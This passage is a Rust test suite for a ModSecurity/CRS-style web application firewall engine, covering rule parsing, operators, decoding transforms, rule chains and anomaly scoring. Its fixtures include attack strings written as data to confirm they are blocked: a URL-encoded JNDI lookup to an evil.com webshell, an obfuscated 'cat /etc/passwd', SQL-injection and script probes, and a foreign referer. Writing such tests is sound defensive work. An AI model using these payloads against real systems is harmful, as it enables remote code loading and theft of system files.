        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = EmptyHeaders;
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some("q=includedscanner"),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_eq!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn pm_and_ip_match_from_file() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("list.txt"), "scanner1\nscanner2\n").unwrap();
        std::fs::write(dir.path().join("ips.txt"), "127.0.0.1/32\n").unwrap();
        let ruleset = parse_rule_file_with_base(
            "crs",
            "SecRule ARGS \"@pmFromFile list.txt\" \"id:9601,deny\"\nSecRule REMOTE_ADDR \"@ipMatchFromFile ips.txt\" \"id:9602,deny\"\n",
            0,
            Some(dir.path()),
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = EmptyHeaders;
        let make = |query: &'static str, ip: IpAddr| WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some(query),
            headers: &headers,
            client_ip: ip,
            route_id: None,
        };
        assert_eq!(
            engine
                .inspect(
                    WafPhase::RequestHeaders,
                    &make("q=scanner1", IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)))
                )
                .action,
            exyonq_waf_api::WafAction::Block
        );
        assert_eq!(
            engine
                .inspect(
                    WafPhase::RequestHeaders,
                    &make("q=other", IpAddr::V4(Ipv4Addr::LOCALHOST))
                )
                .action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn sec_default_action_applies() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let headers = EmptyHeaders;
        let make = |query: &'static str| WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some(query),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        for (default, expect_block) in [("deny", true), ("pass", false)] {
            let contents = format!(
                "SecDefaultAction \"phase:1,{default}\"\nSecRule REQUEST_URI \"@contains defaultme\" \"id:9501\"\n"
            );
            let ruleset = parse_rule_file("crs", &contents, 0);
            let input = crate::compile::WafCompileInput {
                mode: WafMode::Block,
                ..Default::default()
            };
            let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
            let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
            let action = engine
                .inspect(WafPhase::RequestHeaders, &make("q=defaultme"))
                .action;
            assert_eq!(
                action == exyonq_waf_api::WafAction::Block,
                expect_block,
                "default {default}"
            );
        }
    }

    #[test]
    fn detect_range_and_no_match_operators() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let headers = EmptyHeaders;
        let ruleset = parse_rule_file(
            "crs",
            "SecRule ARGS \"@detectSQLi\" \"id:9301,deny\"\nSecRule ARGS \"@detectXSS\" \"id:9302,deny\"\nSecRule ARGS \"@validateByteRange 1-127\" \"id:9303,deny\"\nSecRule ARGS \"@noMatch\" \"id:9304,deny\"\n",
            0,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let make = |query: &'static str| WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some(query),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        for query in ["q=union select", "q=<script>", "q=caf\u{e9}"] {
            assert_eq!(
                engine
                    .inspect(WafPhase::RequestHeaders, &make(query))
                    .action,
                exyonq_waf_api::WafAction::Block,
                "{query}"
            );
        }
        assert_ne!(
            engine
                .inspect(WafPhase::RequestHeaders, &make("q=hello"))
                .action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn js_css_base64_escape_transforms() {
        assert_eq!(
            apply_transforms(r"\x65\x76\x69\x6c", &[CrsTransform::JsDecode]),
            "evil"
        );
        assert_eq!(
            apply_transforms(r"\65\76\69\6c", &[CrsTransform::CssDecode]),
            "evil"
        );
        assert_eq!(
            apply_transforms("ZXZpbA==", &[CrsTransform::Base64DecodeExt]),
            "evil"
        );
        assert_eq!(
            apply_transforms(r"\145\166\151\154", &[CrsTransform::EscapeSeqDecode]),
            "evil"
        );
    }

    #[test]
    fn hex_and_length_transforms() {
        assert_eq!(
            apply_transforms("6576696c", &[CrsTransform::HexDecode]),
            "evil"
        );
        assert_eq!(apply_transforms("hello", &[CrsTransform::Length]), "5");
    }

    #[test]
    fn tx_variable_scoring_blocks() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@contains txme\" \"id:9201,pass,setvar:tx.inbound_anomaly_score=+5\"\nSecRule TX:inbound_anomaly_score \"@ge 5\" \"id:949110,deny\"\n",
            0,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = EmptyHeaders;
        let hit = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some("q=txme"),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_eq!(
            engine.inspect(WafPhase::RequestHeaders, &hit).action,
            exyonq_waf_api::WafAction::Block
        );
        let safe = WafRequest {
            country: None,
            query: None,
            ..hit
        };
        assert_ne!(
            engine.inspect(WafPhase::RequestHeaders, &safe).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn json_body_args_are_flattened_and_scanned() {
        use exyonq_waf_api::{BodyInspectionState, WafEngine, WafMode, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule ARGS \"@rx jndi\" \"id:1,phase:2,block,t:none,t:urlDecodeUni\"\n",
            5,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = crate::MapHeaders::from_pairs(&[("content-type", "application/json")]);
        let req = WafRequest {
            country: None,
            method: "POST",
            host: None,
            path: "/post",
            query: None,
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        let mut state = BodyInspectionState::default();
        let decision = engine.inspect_body_chunk(
            &req,
            br#"{"foo":"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}"#,
            true,
            &mut state,
        );
        assert!(
            decision
                .violations
                .iter()
                .any(|violation| violation.rule_id.as_str() == "1"),
            "JSON arg was not scanned: {:?}",
            decision.violations
        );
    }

    #[test]
    fn prepare_phase_two_executes_crs_rules_like_modsecurity() {
        use exyonq_waf_api::{WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            concat!(
                "SecAction \"id:1,phase:1,pass,nolog,setvar:'tx.executing_paranoia_level=2'\"\n",
                "SecRule REQUEST_URI \"@contains benign\" \"id:2,phase:1,block,",
                "tag:'paranoia-level/2',setvar:'tx.inbound_anomaly_score_pl2=+5'\"\n"
            ),
            5,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = crate::MapHeaders::from_pairs(&[]);
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/benign",
            query: None,
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        // The reference executes PL2 rules; PL4-only 942432 stays out of the
        // differential path (it is the t33 false positive).
        assert_eq!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn chain_ends_with_expands_request_host_macro() {
        use exyonq_waf_api::{BodyInspectionState, WafEngine, WafMode, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        // 943110 shape: the referer host capture must be compared against the
        // request Host macro, not the literal `%{request_headers.host}`.
        let ruleset = parse_rule_file(
            "crs",
            concat!(
                "SecRule ARGS_NAMES \"@rx ^sessionid$\" \"id:943110,phase:2,block,capture,chain\"\n",
                "SecRule REQUEST_HEADERS:Referer \"@rx ^https?://([^/]+)/\" \"capture,chain\"\n",
                "SecRule TX:1 \"!@endsWith %{request_headers.host}\" ",
                "\"setvar:'tx.inbound_anomaly_score_pl1=+5'\"\n"
            ),
            5,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let same = crate::MapHeaders::from_pairs(&[
            ("host", "myapp.com"),
            ("referer", "https://myapp.com/previous"),
        ]);
        let foreign = crate::MapHeaders::from_pairs(&[
            ("host", "myapp.com"),
            ("referer", "https://attacker.example/previous"),
        ]);
        let req = |headers| WafRequest {
            country: None,
            method: "GET",
            host: Some("myapp.com"),
            path: "/login",
            query: Some("sessionid=abc123"),
            headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        let mut state = BodyInspectionState::default();
        assert_ne!(
            engine
                .inspect_body_chunk(&req(&same), b"", true, &mut state)
                .action,
            exyonq_waf_api::WafAction::Block
        );
        let mut state = BodyInspectionState::default();
        assert_eq!(
            engine
                .inspect_body_chunk(&req(&foreign), b"", true, &mut state)
                .action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn chained_member_setvar_blocks_at_threshold() {
        use exyonq_waf_api::{WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        // 920420 shape: the starter captures and stores TX:content_type, the
        // chained member compares it and carries the anomaly setvar. The score
        // must come from the member's delta, not the starter's severity tag.
        let ruleset = parse_rule_file(
            "crs",
            concat!(
                "SecAction \"id:900,phase:1,pass,nolog,",
                "setvar:'tx.critical_anomaly_score=5',",
                "setvar:'tx.allowed_request_content_type=|application/json|'\"\n",
                "SecRule REQUEST_HEADERS:Content-Type \"@rx ^[^;\\s]+\" \"id:920420,phase:1,block,capture,",
                "severity:'CRITICAL',setvar:'tx.content_type=|%{tx.0}|',chain\"\n",
                "SecRule TX:content_type \"!@within %{tx.allowed_request_content_type}\" ",
                "\"t:lowercase,setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"\n"
            ),
            5,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let denied = crate::MapHeaders::from_pairs(&[("content-type", "my-new-content-type")]);
        let allowed = crate::MapHeaders::from_pairs(&[("content-type", "application/json")]);
        let req = |headers| WafRequest {
            country: None,
            method: "POST",
            host: None,
            path: "/",
            query: None,
            headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_eq!(
            engine
                .inspect(WafPhase::RequestHeaders, &req(&denied))
                .action,
            exyonq_waf_api::WafAction::Block
        );
        assert_ne!(
            engine
                .inspect(WafPhase::RequestHeaders, &req(&allowed))
                .action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn secaction_and_ipmatch() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let headers = EmptyHeaders;
        let parsed = parse_rule_file(
            "crs",
            "SecAction \"id:9000,pass,ctl:ruleRemoveById=9002\"\nSecRule REMOTE_ADDR \"@ipMatch 127.0.0.1/32\" \"id:9002,deny\"\n",
            0,
        );
        assert_eq!(parsed.rules.len(), 2);
        assert_eq!(parsed.rules[0].id, "9000");
        assert_eq!(parsed.rules[1].id, "9002");
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[parsed]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: None,
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_ne!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
        let no_match = parse_rule_file(
            "crs",
            "SecRule REMOTE_ADDR \"@ipMatch 10.0.0.0/8\" \"id:9003,deny\"\n",
            0,
        );
        let snapshot = crate::compile::compile_waf_with_crs(
            crate::compile::WafCompileInput {
                mode: WafMode::Block,
                ..Default::default()
            },
            &[no_match],
        )
        .unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        assert_ne!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn numeric_and_within_operators() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let headers = EmptyHeaders;
        let ruleset = parse_rule_file(
            "crs",
            "SecRule ARGS \"@gt 10\" \"id:9101,deny\"\nSecRule ARGS \"@within a b c\" \"id:9102,deny\"\n",
            0,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some("n=42"),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_eq!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
        let within = WafRequest {
            country: None,
            query: Some("v=b"),
            ..req
        };
        assert_eq!(
            engine.inspect(WafPhase::RequestHeaders, &within).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn whitespace_and_normalize_transforms() {
        assert_eq!(
            apply_transforms(
                r"cat /etc/pa\ssw\d",
                &[CrsTransform::CmdLine, CrsTransform::NormalizePath]
            ),
            "cat/etc/passwd"
        );
        assert_eq!(
            apply_transforms("e v i l", &[CrsTransform::RemoveWhitespace]),
            "evil"
        );
        assert_eq!(
            apply_transforms("  a   b  ", &[CrsTransform::CompressWhitespace]),
            "a b"
        );
        assert_eq!(
            apply_transforms("/a//b/./c", &[CrsTransform::NormalizePath]),
            "/a/b/./c"
        );
    }

    #[test]
    fn ctl_detection_only_and_remove_by_id() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let headers = EmptyHeaders;
        let make_req = || WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some("q=ctlme"),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        for rules in [
            "SecRule REQUEST_URI \"@contains ctlme\" \"id:9001,ctl:ruleEngine=DetectionOnly\"\nSecRule REQUEST_URI \"@contains ctlme\" \"id:9002,deny\"\n",
            "SecRule REQUEST_URI \"@contains ctlme\" \"id:9001,ctl:ruleRemoveById=9002\"\nSecRule REQUEST_URI \"@contains ctlme\" \"id:9002,deny\"\n",
        ] {
            let ruleset = parse_rule_file("crs", rules, 0);
            let input = crate::compile::WafCompileInput {
                mode: WafMode::Block,
                ..Default::default()
            };
            let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
            let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
            assert_ne!(
                engine.inspect(WafPhase::RequestHeaders, &make_req()).action,
                exyonq_waf_api::WafAction::Block
            );
        }
    }

    #[test]
    fn skip_action_skips_next_rule() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@contains skipme\" \"id:8001,skip:1\"\nSecRule REQUEST_URI \"@contains skipme\" \"id:8002,deny\"\n",
            0,
        );
        assert_eq!(ruleset.rules[0].skip, 1);
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = EmptyHeaders;
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some("q=skipme"),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_ne!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn skip_after_marker_skips_rules() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@contains skipafter\" \"id:8101,skipAfter:END\"\nSecRule REQUEST_URI \"@contains skipafter\" \"id:8102,deny\"\nSecMarker END\n",
            0,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = EmptyHeaders;
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: Some("q=skipafter"),
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_ne!(
            engine.inspect(WafPhase::RequestHeaders, &req).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn parses_chain_group() {
        let input = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@contains evil\" \"id:7001,deny,chain\"\nSecRule REQUEST_HEADERS:X-Test \"@contains yes\" \"id:7002\"\n",
            0,
        );
        assert_eq!(input.rules.len(), 1);
        assert_eq!(input.rules[0].id, "7001");
        assert_eq!(input.rules[0].chain.len(), 1);
        assert_eq!(input.rules[0].chain[0].id, "7002");
    }

    #[test]
    fn chain_requires_all_rules() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@contains evil\" \"id:7001,deny,chain\"\nSecRule REQUEST_HEADERS:X-Test \"@contains yes\" \"id:7002\"\n",
            0,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let yes = crate::MapHeaders::from_pairs(&[("x-test", "yes")]);
        let no = EmptyHeaders;
        let base = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/evil",
            query: None,
            headers: &yes,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        assert_eq!(
            engine.inspect(WafPhase::RequestHeaders, &base).action,
            exyonq_waf_api::WafAction::Block
        );
        let without = WafRequest {
            country: None,
            headers: &no,
            ..base
        };
        assert_ne!(
            engine.inspect(WafPhase::RequestHeaders, &without).action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn crs_response_phase_blocks_status() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest, WafResponse};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule RESPONSE_STATUS \"@streq 200\" \"id:4001,phase:3,deny\"\n",
            0,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = EmptyHeaders;
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: None,
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        let resp = WafResponse {
            status: 200,
            headers: &headers,
            body: None,
        };
        assert_eq!(
            engine
                .inspect_response(WafPhase::ResponseHeaders, &req, &resp)
                .action,
            exyonq_waf_api::WafAction::Block
        );
    }

    #[test]
    fn base64_and_html_transforms_decode() {
        assert_eq!(
            apply_transforms("ZXZpbGNycw==", &[CrsTransform::Base64Decode]),
            "evilcrs"
        );
        assert_eq!(
            apply_transforms("&lt;evilcrs&gt;", &[CrsTransform::HtmlEntityDecode]),
            "<evilcrs>"
        );
    }

    #[test]
    fn parses_lowercase_transform() {
        let input = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@contains evilcrs\" \"id:3001,deny,t:lowercase\"\n",
            5,
        );
        assert_eq!(input.rules[0].transforms, vec![CrsTransform::Lowercase]);
    }

    #[test]
    fn parses_regex_rule() {
        let input = parse_rule_file(
            "crs",
            "SecRule REQUEST_URI \"@rx (?i)union.*select\" \"id:1001,phase:1,deny,setvar:tx.inbound_anomaly_score=+5\"\n",
            5,
        );
        assert_eq!(input.rules.len(), 1);
        assert_eq!(input.rules[0].id, "1001");
        assert_eq!(input.rules[0].action, WafAction::Block);
        assert_eq!(input.rules[0].score, 5);
    }
}
